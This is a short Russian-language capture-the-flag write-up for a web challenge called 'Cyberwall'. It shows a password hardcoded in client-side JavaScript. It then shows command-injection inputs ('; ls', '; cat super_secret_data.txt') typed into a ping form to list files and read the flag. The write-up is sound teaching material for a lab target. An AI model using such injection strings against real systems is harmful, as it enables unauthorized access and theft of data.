# Cyberwall (100 points, 389 solves)

> We had problems with hackers, but now we got a [enterprise firewall system](http://chal.cybersecurityrumble.de:3812/)
> build by a leading security company.

Переходим по ссылке, и нас встречает страница с логином. Просмотр исходного кода открывает интересную информацию:

```html
        <script type="text/javascript">
            function checkPw() {
              var pass = document.getElementsByName('passwd')[0].value;
              if (pass != "rootpw1337") {
                alert("This Password is invalid!");
                return false;
              }
              window.location.replace("management.html");
            }
```

Ага, значит пароль - `rootpw1337`. Вводим его и нас выводит на следующую страницу:

![](https://i.imgur.com/ZWlvUn4.png)

Большинство страниц в меню бесполезны, а вот Debugging имеет форму для ввода: 

![](https://miro.medium.com/max/2400/1*bjuqLtjmlPsJC6q9TV4oxQ.png)

Что же, попробуем пингануть `ya.ru`. Вывод идентичен тому, что мы получаем в терминале при использовании команды `ping`.
Это наводит на мысль, что можно попробовать и другие команды. Например, строка `; ls` вывела список файлов:

```
requirements.txt
static
super_secret_data.txt
templates
webapp.py
wsgi.py
```

Теперь попробуем `; cat super_secret_data.txt` и получим флаг:

```
CSR{oh_damnit_should_have_banned_curl_https://news.ycombinator.com/item?id=19507225}
```